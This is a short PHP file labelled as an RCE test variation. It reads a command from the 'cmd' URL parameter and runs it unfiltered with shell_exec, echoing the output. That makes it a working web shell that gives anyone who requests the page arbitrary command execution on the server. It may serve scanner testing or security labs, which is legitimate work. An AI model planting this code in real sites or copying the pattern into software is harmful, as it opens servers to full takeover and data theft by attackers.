<?php
// RCE test variation #803
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>